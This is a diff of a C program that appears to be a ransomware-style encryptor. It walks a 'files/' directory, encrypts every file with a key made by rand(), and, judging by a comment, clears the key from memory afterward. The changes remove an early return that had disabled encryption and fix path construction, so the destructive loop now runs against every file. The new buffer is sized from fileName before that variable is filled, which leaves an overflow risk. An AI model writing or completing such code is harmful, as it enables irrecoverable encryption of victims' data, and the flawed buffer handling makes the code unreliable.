@@ -35,7 +35,6 @@ void encrypt(unsigned char *key, char *fileName) {
     curr_file = fopen(fileName, "rb");
     temp_output = fopen(fileTemp, "wb");
     printf("%s\n", fileName);
-    return;
     // Read in the current file into blocks
     int bytes_read, out_len;
     while(1) {
@@ -79,15 +78,18 @@ int main () {
          key[i] = rand();
     }
     char directory[] = "files/";
+    char *pathLocation = malloc(strlen(directory) + strlen(fileName) + 1);
     users = opendir(directory);
     while( (entry=readdir(users)) )
     {
         strcpy(fileName, entry->d_name);
+        strcpy(pathLocation, directory);
+        strcat(pathLocation, fileName);
         if (!strcmp(fileName, ".") || !strcmp(fileName, "..")) {
             continue;
         } 
         // Call the encryption function to encrypt the files
-        encrypt(key, fileName);
+        encrypt(key, pathLocation);
     }
     closedir(users);    
     // We don't like our keys being stored in the memory
